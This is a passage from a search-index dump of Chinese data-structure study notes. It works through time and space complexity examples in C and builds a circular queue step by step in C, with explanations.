<p>\u7136\u800c\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u8003\u8651\u5185\u90e8\u7684\u8d4b\u503c\u64cd\u4f5c <code>x = x + 1;</code>\u3002\u8fd9\u4e2a\u64cd\u4f5c\u5728\u6700\u5185\u5c42\u5faa\u73af\u4e2d\u6267\u884c\uff0c\u800c\u6700\u5185\u5c42\u5faa\u73af\u7684\u6b21\u6570\u7b49\u4e8e\u7b2c\u4e8c\u5c42\u5faa\u73af\u7684\u6b21\u6570\u4e58\u4ee5\u7b2c\u4e09\u5c42\u5faa\u73af\u7684\u6b21\u6570\uff0c\u5373<code>(i/2) * (i/2) = i^2/4</code>\u3002</p> <p>\u56e0\u6b64\uff0c\u603b\u7684\u8d4b\u503c\u64cd\u4f5c\u6b21\u6570\u53ef\u4ee5\u8fd1\u4f3c\u4e3a\uff1a</p> <p><code>1^2/4 + 2^2/4 + 3^2/4 + ... + n^2/4 \u2248 (1/4) * (1^2 + 2^2 + 3^2 + ... + n^2)</code></p> <p>\u8fd9\u4e2a\u6c42\u548c\u7ed3\u679c\u662f\u4e00\u4e2a\u5e73\u65b9\u548c\u7684\u5f62\u5f0f\uff0c\u6839\u636e\u5e73\u65b9\u548c\u7684\u6c42\u548c\u516c\u5f0f\uff0c\u53ef\u4ee5\u5f97\u5230\uff1a</p> <p><code>(1/4) * (1^2 + 2^2 + 3^2 + ... + n^2) = (1/4) * (n * (n+1) * (2n+1)) / 6</code></p> <p>\u56e0\u6b64\uff0c\u8d4b\u503c\u64cd\u4f5c\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u53ef\u4ee5\u8fd1\u4f3c\u4e3aO(n^3)\u3002</p> <p>\u7efc\u5408\u8003\u8651\u5faa\u73af\u6b21\u6570\u548c\u8d4b\u503c\u64cd\u4f5c\u6b21\u6570\uff0c\u6700\u7ec8\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(n^3)\u3002</p>"},{"location":"DEC/Data-Structure/%E5%A4%8D%E6%9D%82%E5%BA%A6/#3","title":"3","text":"C<pre><code>int main() {\n    int i = 1;\n    int n;\n    while (i &lt;= n) {\n        i = i * 2;\n    }\n    return 0;\n}\n</code></pre> <p>\u8fd9\u6bb5\u51fd\u6570\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u662f O(log n)\u3002</p> <p>\u8ba9\u6211\u4eec\u9010\u6b65\u5206\u6790\uff1a</p> <ol> <li> <p>\u521d\u59cb\u5316\u53d8\u91cf\uff1a<code>int i = 1;</code> \u8fd9\u662f\u4e00\u4e2a\u5e38\u6570\u65f6\u95f4\u64cd\u4f5c\uff0c\u4e0e\u8f93\u5165\u89c4\u6a21 n \u65e0\u5173\u3002</p> </li> <li> <p>\u5faa\u73af\u6761\u4ef6\uff1a<code>while (i &lt;= n)</code>\uff0c\u5faa\u73af\u4f1a\u4e00\u76f4\u6267\u884c\u76f4\u5230 i \u5927\u4e8e n\u3002</p> </li> <li> <p>\u5faa\u73af\u4f53\u5185\u64cd\u4f5c\uff1a<code>i = i * 2;</code> \u8fd9\u4e2a\u64cd\u4f5c\u5c06 i \u4e58\u4ee5 2\uff0c\u5373\u4f7f\u6bcf\u6b21\u5faa\u73af i \u7684\u503c\u90fd\u4f1a\u7ffb\u500d\u3002</p> </li> </ol> <p>\u6839\u636e\u4e0a\u8ff0\u5206\u6790\uff0c\u5faa\u73af\u4f53\u5185\u7684\u64cd\u4f5c\u4f1a\u5bfc\u81f4 i \u7684\u503c\u4ee5\u6307\u6570\u5f62\u5f0f\u589e\u957f\uff0c\u5373 i \u7684\u53d6\u503c\u5e8f\u5217\u4e3a 1, 2, 4, 8, 16, ...\uff0c\u76f4\u5230 i \u5927\u4e8e n\u3002</p> <p>\u56e0\u6b64\uff0c\u5faa\u73af\u7684\u8fed\u4ee3\u6b21\u6570\u53d6\u51b3\u4e8e i \u80fd\u591f\u589e\u957f\u5230\u591a\u5c11\u624d\u80fd\u8d85\u8fc7 n\u3002\u5047\u8bbe\u6700\u540e\u4e00\u6b21\u5faa\u73af\u65f6 i \u7684\u503c\u4e3a m\uff0c\u5219\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\uff1a</p> <p><code>2^m &gt; n</code></p> <p>\u82e5\u5faa\u73af\u6267\u884c1\u6b21\uff1ai = 1 x 2 = 2</p> <p>\u82e5\u5faa\u73af\u6267\u884c2\u6b21\uff1ai = 2 x 2 = 2^2^</p> <p>\u82e5\u5faa\u73af\u6267\u884c3\u6b21\uff1ai = 2^2^ x 2 = 2^3^</p> <p>\u82e5\u5faa\u73af\u6267\u884c m \u6b21\uff1ai = 2^m^</p> <p>\u8981\u6c42\uff1a<code>i&lt;=m</code>\uff0c\u5373 2^m^ &lt;= n\uff0c</p> <p>\u5373<code>m &gt;= log2(n)</code></p> <p>\u56e0\u6b64\uff0c\u8fed\u4ee3\u6b21\u6570 m \u7684\u4e0a\u9650\u4e3a log2(n)\u3002\u7531\u4e8e\u6bcf\u6b21\u8fed\u4ee3\u90fd\u4f1a\u5c06 i \u503c\u7ffb\u500d\uff0c\u56e0\u6b64\u8fed\u4ee3\u6b21\u6570 m \u7684\u4e0a\u9650\u4e5f\u8868\u793a i \u7684\u6700\u5927\u503c\u3002</p> <p>\u7efc\u4e0a\u6240\u8ff0\uff0c\u8be5\u51fd\u6570\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a O(log n)\u3002</p>"},{"location":"DEC/Data-Structure/%E5%A4%8D%E6%9D%82%E5%BA%A6/#4","title":"4","text":"C<pre><code>// \u8ba1\u7b97BinarySearch\u7684\u65f6\u95f4\u590d\u6742\u5ea6\uff1f\nint BinarySearch(int* a, int n, int x)\n{\n    assert(a);\n    int begin = 0;\n    int end = n;\n    while (begin &lt; end)\n    {\n        int mid = begin + ((end - begin) &gt;&gt; 1);\n        if (a[mid] &lt; x)\n            begin = mid + 1;\n        else if (a[mid] &gt; x)\n            end = mid;\n        else\n            return mid;\n    }\n    return -1;\n}\n</code></pre> <p>\u57fa\u672c\u64cd\u4f5c\u6267\u884c\u6700\u597d1\u6b21\uff0c\u6700\u574f<code>O(logN)</code>\u6b21\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a <code>O(logN)</code> </p> <p>ps\uff1alogN\u5728\u7b97\u6cd5\u5206\u6790\u4e2d\u8868\u793a\u662f\u5e95\u6570\u4e3a2\uff0c\u5bf9\u6570\u4e3aN\u3002\u6709\u4e9b\u5730\u65b9\u4f1a\u5199\u6210lgN\u3002\uff08\u5efa\u8bae\u901a\u8fc7\u6298\u7eb8\u67e5\u627e\u7684\u65b9\u5f0f\u8bb2\u89e3logN\u662f \u600e\u4e48\u8ba1\u7b97\u51fa\u6765\u7684\uff09</p>"},{"location":"DEC/Data-Structure/%E5%A4%8D%E6%9D%82%E5%BA%A6/#5","title":"5","text":"C<pre><code>// \u8ba1\u7b97\u9636\u4e58\u9012\u5f52Factorial\u7684\u65f6\u95f4\u590d\u6742\u5ea6\uff1f\nlong long Factorial(size_t N)\n{\n    return N &lt; 2 ? N : Factorial(N - 1) * N;\n}\n</code></pre> <p>\u901a\u8fc7\u8ba1\u7b97\u5206\u6790\u53d1\u73b0\u57fa\u672c\u64cd\u4f5c\u9012\u5f52\u4e86N\u6b21\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(N)\u3002</p>"},{"location":"DEC/Data-Structure/%E5%A4%8D%E6%9D%82%E5%BA%A6/#_3","title":"\u7a7a\u95f4\u590d\u6742\u5ea6\u4f8b\u9898","text":""},{"location":"DEC/Data-Structure/%E5%A4%8D%E6%9D%82%E5%BA%A6/#1_1","title":"1","text":"C<pre><code>// \u8ba1\u7b97BubbleSort\u7684\u7a7a\u95f4\u590d\u6742\u5ea6\uff1f\nvoid BubbleSort(int* a, int n)\n{\n    assert(a);\n    for (int end = n; end &gt; 0; --end)\n    {\n        int exchange = 0;\n        for (int i = 1; i &lt; end; ++i)\n        {\n            if (a[i - 1] &gt; a[i])\n            {\n                Swap(&amp;a[i - 1], &amp;a[i]);\n                exchange = 1;\n            }\n        }\n        if (exchange == 0)\n            break;\n    }\n}\n</code></pre> <p>\u4f7f\u7528\u4e86\u5e38\u6570\u4e2a\u989d\u5916\u7a7a\u95f4\uff0c\u6240\u4ee5\u7a7a\u95f4\u590d\u6742\u5ea6\u4e3a O(1)</p>"},{"location":"DEC/Data-Structure/%E5%A4%8D%E6%9D%82%E5%BA%A6/#2_1","title":"2","text":"C<pre><code>// \u8ba1\u7b97Fibonacci\u7684\u7a7a\u95f4\u590d\u6742\u5ea6\uff1f\nlong long* Fibonacci(int n)\n{\n    if (n == 0)\n        return;\n    long long* fibArray = (long long*)malloc((n + 1) * sizeof(long long));\n    fibArray[0] = 0;\n    fibArray[1] = 1;\n    for (int i = 2; i &lt;= n; ++i)\n    {\n        fibArray[i] = fibArray[i - 1] + fibArray[i - 2];\n    }\n    return fibArray;\n}\n</code></pre> <p>\u52a8\u6001\u5f00\u8f9f\u4e86N\u4e2a\u7a7a\u95f4\uff0c\u7a7a\u95f4\u590d\u6742\u5ea6\u4e3a O(N)</p>"},{"location":"DEC/Data-Structure/%E5%A4%8D%E6%9D%82%E5%BA%A6/#3_1","title":"3","text":"C<pre><code>// \u8ba1\u7b97\u9636\u4e58\u9012\u5f52Factorial\u7684\u7a7a\u95f4\u590d\u6742\u5ea6\uff1f\nlong long Factorial(int N)\n{\n    return N &lt; 2 ? N : Factorial(N - 1) * N;\n}\n</code></pre> <p>\u9012\u5f52\u8c03\u7528\u4e86N\u6b21\uff0c\u5f00\u8f9f\u4e86N\u4e2a\u6808\u5e27\uff0c\u6bcf\u4e2a\u6808\u5e27\u4f7f\u7528\u4e86\u5e38\u6570\u4e2a\u7a7a\u95f4\u3002\u7a7a\u95f4\u590d\u6742\u5ea6\u4e3aO(N)</p>"},{"location":"DEC/Data-Structure/%E5%A4%8D%E6%9D%82%E5%BA%A6/#oj","title":"OJ","text":"<p>\u65cb\u8f6c\u6570\u7ec4</p> <p>OJ\u94fe\u63a5\uff1ahttps://leetcode-cn.com/problems/rotate-array/</p> <p></p>"},{"location":"DEC/Data-Structure/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/","title":"\u5faa\u73af\u961f\u5217","text":"<p>\u539f\u6587\u5730\u5740\uff1a \u6570\u636e\u7ed3\u6784\u2014\u2014\u5faa\u73af\u961f\u5217\u8be6\u89e3</p> <p>\u6700\u8fd1\u6570\u636e\u7ed3\u6784\u4e0a\u7684\u8d8a\u6765\u8d8a\u5feb\u4e86\uff0c\u8fd9\u4e2a\u4e1c\u897f\u4e5f\u4e0d\u6253\u7b97\u81ea\u5df1\u5199\u4e86\uff0c\u8fd9\u7bc7\u6587\u7ae0\u5199\u7684 Very Good\u3002</p>"},{"location":"DEC/Data-Structure/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/#_2","title":"\u4e00\u3001\u5faa\u73af\u961f\u5217\u7684\u5b9a\u4e49","text":"<p>\u5b9a\u4e49\uff1a\u961f\u5217\u4e3b\u8981\u6709\u987a\u5e8f\u961f\u5217\uff0c\u5faa\u73af\u961f\u5217\uff0c\u53cc\u7aef\u961f\u5217\uff0c\u4f18\u5148\u961f\u5217\u3002\u800c\u5f53\u4e2d\u5faa\u73af\u961f\u5217\u662f\u4e00\u79cd\u7ebf\u6027\u6570\u636e\u7ed3\u6784\u3002\u5b83\u4e5f\u88ab\u79f0\u4e3a \u201c\u73af\u5f62\u7f13\u51b2\u5668\u201d\u3002\u5b83\u53ea\u5141\u8bb8\u5728\u4e00\u7aef\u8fdb\u884c\u63d2\u5165\u64cd\u4f5c\uff0c\u5373\u961f\u5c3e\uff08rear\uff09\uff0c\u800c\u5728\u53e6\u4e00\u7aef\u8fdb\u884c\u5220\u9664\u64cd\u4f5c\uff0c\u5373\u961f\u5934 (front)\uff0c\u5176\u64cd\u4f5c\u8868\u73b0\u57fa\u4e8e FIFO\uff08\u5148\u8fdb\u5148\u51fa\uff09\u539f\u5219\u5e76\u4e14\u961f\u5c3e\u88ab\u8fde\u63a5\u5728\u961f\u9996\u4e4b\u540e\u4ee5\u5f62\u6210\u4e00\u4e2a\u5faa\u73af\u3002\u5411\u961f\u5217\u4e2d\u63d2\u5165\u65b0\u7684\u6570\u636e\u5143\u7d20\u79f0\u4e3a\u5165\u961f\uff0c\u65b0\u5165\u961f\u7684\u5143\u7d20\u5c31\u6210\u4e3a\u4e86\u961f\u5217\u7684\u961f\u5c3e\u5143\u7d20\u3002</p> <p>\u7279\u70b9\uff1a</p> <ol> <li>\u5faa\u73af\u961f\u5217\u5141\u8bb8\u5143\u7d20\u5728\u961f\u5c3e\u63d2\u5165\uff0c\u5728\u961f\u5934\u5220\u9664\uff0c\u540c\u65f6\u9075\u5faa\u5148\u8fdb\u5148\u51fa\u539f\u5219\u3002</li> <li>\u7531\u4e8e\u5faa\u73af\u961f\u5217\u662f\u57fa\u4e8e\u6570\u7ec4\u5b9e\u73b0\u7684\uff0c\u6240\u4ee5\u5b83\u7684\u8bbf\u95ee\u901f\u5ea6\u5f88\u5feb\uff0c\u7279\u522b\u662f\u5728\u79fb\u52a8\u5143\u7d20\u65f6\u3002</li> <li>\u5982\u679c\u9700\u8981\u5927\u91cf\u6dfb\u52a0\u548c\u5220\u9664\u5143\u7d20\uff0c\u5faa\u73af\u961f\u5217\u6bd4\u94fe\u8868\u66f4\u6709\u6548\u7387\uff0c\u56e0\u4e3a\u5b83\u4e0d\u9700\u8981\u9891\u7e41\u5730\u79fb\u52a8\u6307\u9488\u6765\u8bbf\u95ee\u5143\u7d20\u3002</li> <li>\u4e0d\u652f\u6301\u968f\u673a\u8bbf\u95ee\u5143\u7d20\uff0c\u56e0\u6b64\u4e0d\u80fd\u50cf\u6570\u7ec4\u90a3\u6837\u76f4\u63a5\u8bbf\u95ee\u7279\u5b9a\u4f4d\u7f6e\u7684\u5143\u7d20\u3002</li> </ol>"},{"location":"DEC/Data-Structure/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/#_3","title":"\u4e8c\u3001 \u5faa\u73af\u961f\u5217\u7684\u57fa\u672c\u64cd\u4f5c","text":"<ol> <li> <p>\u521d\u59cb\u5316\uff1a\u8fd9\u662f\u521b\u5efa\u4e00\u4e2a\u7a7a\u7684\u987a\u5e8f\u961f\u5217\uff0c\u9700\u8981\u8bbe\u5b9a\u961f\u9996\u6307\u9488 front \u548c\u961f\u5c3e\u6307\u9488 rear \u90fd\u6307\u5411\u540c\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u4e00\u822c\u521d\u59cb\u90fd\u8bbe\u7f6e\u4e3a 0\uff0c\u5373\u961f\u5217\u4e3a\u7a7a\u3002</p> </li> <li> <p>\u5143\u7d20\u5165\u961f\uff1a\u4e5f\u88ab\u79f0\u4e3a\u63d2\u5165\u64cd\u4f5c\uff0c\u662f\u5c06\u4e00\u4e2a\u65b0\u5143\u7d20\u6dfb\u52a0\u5230\u961f\u5217\u5c3e\u90e8\u7684\u64cd\u4f5c\u3002</p> </li> <li> <p>\u5143\u7d20\u51fa\u961f\uff1a\u4e5f\u88ab\u79f0\u4e3a\u5220\u9664\u64cd\u4f5c\uff0c\u662f\u5c06\u961f\u5217\u5934\u90e8\u7684\u5143\u7d20\u79fb\u9664\u7684\u64cd\u4f5c\u3002</p> </li> <li> <p>\u6c42\u961f\u5217\u957f\u5ea6\uff1a\u53ef\u4ee5\u901a\u8fc7\u8ba1\u7b97\u961f\u5c3e\u6307\u9488\u548c\u961f\u9996\u6307\u9488\u4e4b\u5dee\u7684\u503c\u518d\u52a0 1 \u6765\u83b7\u53d6\u5f53\u524d\u961f\u5217\u7684\u957f\u5ea6\u3002</p> </li> <li> <p>\u5224\u65ad\u662f\u5426\u4e3a\u7a7a\uff1a\u901a\u8fc7\u68c0\u67e5\u961f\u9996\u6307\u9488 front \u548c\u961f\u5c3e\u6307\u9488 rear \u662f\u5426\u76f8\u7b49\u6765\u5224\u65ad\u961f\u5217\u662f\u5426\u4e3a\u7a7a\u3002</p> </li> <li> <p>\u5224\u65ad\u662f\u5426\u4e3a\u6ee1\uff1a\u5f53\u961f\u5c3e\u6307\u9488\u6307\u5411\u6570\u7ec4\u7684\u6700\u540e\u4e00\u4e2a\u4f4d\u7f6e\u65f6\uff0c\u4e0b\u4e00\u4e2a\u8981\u63d2\u5165\u7684\u4f4d\u7f6e\u5c31\u662f\u961f\u5934\u6307\u9488\u3002</p> </li> <li> <p>\u53d6\u961f\u5934\uff1a\u5934\u5143\u7d20\u5c31\u662f\u961f\u5217\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\uff0c\u53ef\u4ee5\u901a\u8fc7\u8fd4\u56de\u961f\u9996\u6307\u9488 front \u7684\u503c\u6765\u83b7\u53d6\u3002</p> </li> <li> <p>\u8f93\u51fa\u961f\u5217\uff1a\u5c06\u961f\u5217\u4e2d\u5143\u7d20\u901a\u8fc7 while \u8bed\u53e5\u5faa\u73af\u8bed\u53e5\u6253\u5370\u51fa\u6765</p> </li> </ol>"},{"location":"DEC/Data-Structure/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/#_4","title":"\u4e09\u3001\u5faa\u73af\u961f\u5217\u7684\u5b9e\u73b0","text":""},{"location":"DEC/Data-Structure/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/#1","title":"1\u3001\u5faa\u73af\u961f\u5217\u7684\u5b9a\u4e49","text":"<p>\u7528\u4e00\u4e2a\u6570\u7ec4\u6765\u5b58\u50a8\u961f\u5217\u4e2d\u7684\u5143\u7d20\uff0c\u7528 front \u4f5c\u4e3a\u961f\u5934\u6307\u9488\uff0c\u6307\u5411\u961f\u5217\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\uff0c\u7528 rear \u4f5c\u4e3a\u961f\u5c3e\u6307\u9488\uff0c\u5373\u6307\u5411\u961f\u5217\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u7684\u4e0b\u4e00\u4e2a\u4f4d\u7f6e.</p> C<pre><code>#define MAXSIZE 4\n\ntypedef int DataType;\n\ntypedef struct\n{\n    DataType data[MAXSIZE];\n    int front;\n    int rear;\n}CirclesQueue;\n</code></pre>"},{"location":"DEC/Data-Structure/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/#2","title":"2\u3001\u5faa\u73af\u961f\u5217\u7684\u521d\u59cb\u5316","text":"<p>\u5faa\u73af\u961f\u5217\u7684\u521d\u59cb\u5316\u53ea\u9700\u8981\u5c06\u961f\u5934\u6307\u9488\uff08front\uff09\u548c\u961f\u5c3e\u6307\u9488\uff08rear\uff09\u90fd\u521d\u59cb\u5316\u4e3a 0.</p> C<pre><code>/*\u5faa\u73af\u961f\u5217\u521d\u59cb\u5316*/\nint init(CirclesQueue *Q)\n{\n    Q-&gt;front = Q-&gt;rear = 0;\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/#3","title":"3\u3001\u5faa\u73af\u961f\u5217\u51fa\u961f","text":"<p>\u51fa\u961f\u524d\u5224\u65ad\u961f\u5217\u662f\u5426\u4e3a\u7a7a\uff0c\u5982\u679c\u4e3a\u7a7a\uff0c\u8fd4\u56de 100002 \u9519\u8bef\u4fe1\u606f\uff0c\u5982\u679c\u961f\u5217\u4e0d\u4e3a\u7a7a\uff0c\u5c06\u961f\u5217\u7684\u961f\u5934\u6307\u9488\u5411\u524d\u79fb\u52a8\u4e00\u4f4d\uff0c\u5373\u5c06\u961f\u5934\u6307\u9488\u52a0 1 \u5e76\u5bf9 MAXSIZE \u53d6\u6a21\uff0c\u786e\u4fdd\u6307\u9488\u5728\u6570\u7ec4\u8303\u56f4\u5185\u5faa\u73af\u79fb\u52a8\uff0c\u5f53\u5230\u8fbe\u6570\u7ec4\u672b\u5c3e\u65f6\uff0c\u4f1a\u56de\u5230\u6570\u7ec4\u7684\u5f00\u5934\u3002</p> C<pre><code>/*\u51fa\u961f*/\nint dequeue(CirclesQueue *Q, DataType *x)\n{\n    if(isempty(Q))\n    {\n        printf(\"\u961f\u5217\u4e3a\u7a7a\uff01100002\\n\");\n        return 100002;\n    }\n    Q-&gt;front = (Q-&gt;front+1) % MAXSIZE;\n    *x = Q-&gt;data[Q-&gt;front];\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/#4","title":"4\u3001\u5faa\u73af\u961f\u5217\u5165\u961f","text":"<p>\u5165\u961f\u524d\u9700\u8981\u5224\u65ad\u961f\u5217\u662f\u5426\u5df2\u7ecf\u6ee1\u4e86\uff0c\u5982\u679c\u961f\u5217\u4e3a\u6ee1\uff0c\u5219\u4e0d\u80fd\u5165\u961f\u3002\u53cd\u4e4b\uff0c\u5219\u5c06\u961f\u5217\u7684\u961f\u5934\u5411\u524d\u79fb\u52a8\u4e00\u4f4d\uff0c\u786e\u4fdd\u6307\u9488\u5728\u6570\u7ec4\u8303\u56f4\u5185\u80fd\u591f\u5faa\u73af\u79fb\u52a8\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5c31\u662f\u5c06\u5f53\u524d\u961f\u5934\u6307\u9488\u7684\u503c\u52a0 1\uff0c\u7136\u540e\u5bf9\u961f\u5217\u7684\u6700\u5927\u5bb9\u91cf\uff08MAXSIZE\uff09\u53d6\u6a21\u6765\u5b9e\u73b0\u3002</p> C<pre><code>/*\u5165\u961f*/\nint enqueue(CirclesQueue *Q, DataType x)\n{\n    if(isfull(Q))\n    {\n        printf(\"\u961f\u5217\u5df2\u6ee1\uff01100001\\n\");\n        return 100001;\n    }\n\n    Q-&gt;rear = (Q-&gt;rear+1) % MAXSIZE;\n    Q-&gt;data[Q-&gt;rear] = x;\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/#5","title":"5\u3001\u961f\u5217\u5224\u7a7a","text":"<p>\u5224\u65ad\u5faa\u73af\u961f\u5217\u662f\u5426\u4e3a\u7a7a\u901a\u8fc7\u6bd4\u8f83\u961f\u5934\u6307\u9488\u548c\u961f\u5c3e\u6307\u9488\u662f\u5426\u76f8\u7b49\u6765\u5224\u65ad\uff0c\u5982\u679c\u5b83\u4eec\u76f8\u7b49\uff0c\u8bf4\u660e\u961f\u5217\u4e2d\u6ca1\u6709\u5143\u7d20\uff0c\u53cd\u4e4b\u5219\u5b58\u5728\u5143\u7d20\u3002\u00a0</p> C<pre><code>/*\u961f\u7a7a*/\nint isempty(CirclesQueue *Q)\n{\n    return (Q-&gt;front == Q-&gt;rear) ? 1 : 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/#6","title":"6\u3001 \u961f\u5217\u5224\u6ee1","text":"<p>\u5224\u65ad\u5faa\u73af\u961f\u5217\u662f\u5426\u4e3a\u6ee1\u53ef\u4ee5\u8ba9\u961f\u5217\u7684 rear \u6307\u9488\u52a0 1 \u4e4b\u540e\u5bf9 MAXSIZE \u53d6\u6a21\u7ed3\u679c\u7b49\u4e8e front \u6307\u9488\uff0c\u8fd9\u65f6\u8868\u660e\u961f\u5217\u5df2\u6ee1\uff0c\u53cd\u4e4b\u5219\u672a\u6ee1\u3002</p> C<pre><code>/*\u961f\u6ee1\uff1f*/\nint isfull(CirclesQueue *Q)\n{\n    return (Q-&gt;rear+1)%MAXSIZE == Q-&gt;front ? 1 : 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/#7","title":"7\u3001\u53d6\u961f\u5934\u5143\u7d20","text":"<p>\u60f3\u8981\u83b7\u53d6\u961f\u5934\u5143\u7d20\uff0c\u9996\u5148\u9700\u8981\u5224\u65ad\u961f\u5217\u662f\u5426\u4e3a\u7a7a\uff0c\u5982\u679c\u4e3a\u7a7a\uff0c\u8fd4\u56de\u9519\u8bef\u4fe1\u606f\u3002\u4e0d\u4e3a\u7a7a\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7\u8ba1\u7b97 front \u52a0 1 \u540e\u5bf9 MAXSIZE \u53d6\u6a21\u83b7\u53d6\u961f\u9996\u5143\u7d20\u7684\u4f4d\u7f6e\u3002</p> C<pre><code>/*\u53d6\u961f\u5934\u5143\u7d20*/\nint QueueFront(CirclesQueue *Q,DataType *x)\n{\n    if(isempty(Q))\n    {\n        printf(\"\u961f\u5217\u4e3a\u7a7a\uff01100002\\n\");\n        return 100002;\n    }\n    *x = Q-&gt;data[(Q-&gt;front + 1) % MAXSIZE];\n    return 0;\n</code></pre>"},{"location":"DEC/Data-Structure/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/#8","title":"8\u3001\u8f93\u51fa\u961f\u5217","text":"<p>\u8f93\u51fa\u961f\u5217\u524d\u9700\u8981\u5148\u5224\u65ad\u961f\u5217\u662f\u5426\u4e3a\u7a7a\uff0c\u5982\u679c\u4e3a\u7a7a\u5219\u8f93\u51fa\u961f\u5217\u4e3a\u7a7a\uff0c\u4e0d\u4e3a\u7a7a\u65f6\uff0c\u5c06\u961f\u5934\u6307\u9488\u7684\u503c\u8d4b\u7ed9<code>i</code>\uff0c\u5e76\u5bf9\u6700\u5927\u5bb9\u91cf<code>MAXSIZE</code>\u53d6\u6a21\uff0c\u518d\u901a\u8fc7 do-while \u5faa\u73af\u6765\u904d\u5386\u961f\u5217\u4e2d\u7684\u5143\u7d20\uff0c\u5faa\u73af\u7684\u5185\u90e8\u901a\u8fc7\u8ba1\u7b97<code>(i + 1 % MAXSIZE)</code>\u6765\u83b7\u53d6\u4e0b\u4e00\u4e2a\u5143\u7d20\u7684\u7d22\u5f15\uff0c\u5e76\u8f93\u51fa\u6253\u5370\u5f53\u524d\u5143\u7d20\uff0c\u540c\u65f6\u66f4\u65b0<code>i</code>\u7684\u503c\uff0c\u4f7f\u5176\u52a0 1 \u5e76\u5bf9<code>MAXSIZE</code>\u53d6\u6a21\uff0c\u4ee5\u4fbf\u7ee7\u7eed\u904d\u5386\u961f\u5217\u3002</p> C<pre><code>/*\u8f93\u51fa\u961f\u5217*/\nvoid PrintQueue(CirclesQueue *Q){\n    int i;\n    if (isempty(Q))\n    {\n        printf(\"\u961f\u5217\u4e3a\u7a7a\uff01\\n\");\n        return;\n    }\n    i=(Q-&gt;front)%MAXSIZE;    //\u786e\u4fddi\u7684\u503c\u57280\u5230MAXSIZE-1\u4e4b\u95f4\uff0c\u4ee5\u4fbf\u5728\u540e\u7eed\u64cd\u4f5c\u4e2d\u4f5c\u4e3a\u6570\u7ec4\u7d22\u5f15\u4f7f\u7528\n    do\n    {\n        printf(\"%d\u3001\",Q-&gt;data[(i + 1 % MAXSIZE)]);\n        i=(i+1)%MAXSIZE;\n    }while(i!=Q-&gt;rear);\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/#9","title":"9\u3001\u6c42\u961f\u5217\u957f\u5ea6","text":"<p>\u6c42\u5faa\u73af\u961f\u5217\u7684\u957f\u5ea6\u53ef\u4ee5\u901a\u8fc7\u8ba1\u7b97\u961f\u5217\u7684\u5c3e\u6307\u9488\uff08rear\uff09\u548c\u5934\u6307\u9488\uff08front\uff09\u4e4b\u95f4\u7684\u5dee\u503c\uff0c\u52a0\u4e0a\u6700\u5927\u5bb9\u91cf (MAXSIZE)\uff0c\u7136\u540e\u5bf9\u6700\u5927\u5bb9\u91cf\u53d6\u6a21\uff0c\u5f97\u5230\u961f\u5217\u7684\u5b9e\u9645\u957f\u5ea6\u3002\u6700\u540e\uff0c\u5c06\u8ba1\u7b97\u7ed3\u679c\u5b58\u50a8\u5728\u6307\u9488 x \u6240\u6307\u5411\u7684\u4f4d\u7f6e\uff0c\u5e76\u8fd4\u56de 0 \u8868\u793a\u6210\u529f\u3002</p> C<pre><code>*\u83b7\u53d6\u961f\u5217\u957f\u5ea6*/ \nint getLength(CirclesQueue *Q,DataType *x) {  \n  *x= (Q-&gt;rear - Q-&gt;front + MAXSIZE) % MAXSIZE; \n  return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/#_5","title":"\u56db\u3001\u5b8c\u6574\u4ee3\u7801","text":""},{"location":"DEC/Data-Structure/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/#1mainc","title":"1\u3001main.c","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include \"CirclesQueue.h\"\n\n\nint main(int argc, char* argv[])\n{\n    CirclesQueue Q;\n    DataType x;\n    int cmd;\n    char yn;\n\n\n    do\n    {   \n        printf(\"-----------\u5faa\u73af\u961f\u5217\u6f14\u793a-----------\\n\");\n        printf(\" 1. \u521d\u59cb\u5316\\n\");\n        printf(\" 2. \u5165\u961f\\n\");\n        printf(\" 3. \u51fa\u961f\\n\");\n        printf(\" 4. \u961f\u7a7a\uff1f\\n\");\n        printf(\" 5. \u961f\u6ee1\\n\");\n        printf(\" 6.\u53d6\u961f\u5934\\n\");\n        printf(\" 7.\u8f93\u51fa\u961f\u5217\\n\");\n        printf(\" 8.\u53d6\u957f\u5ea6\\n\");\n        printf(\" 9.\u5e2e\u52a9\\n\");\n        printf(\" 0. \u9000\u51fa\\n\");\n        printf(\" \u8bf7\u9009\u62e9\uff080~6\uff09\uff1a\");\n        scanf(\"%d\",&amp;cmd);\n        switch(cmd)\n        {\n        case 1:\n            init(&amp;Q);\n            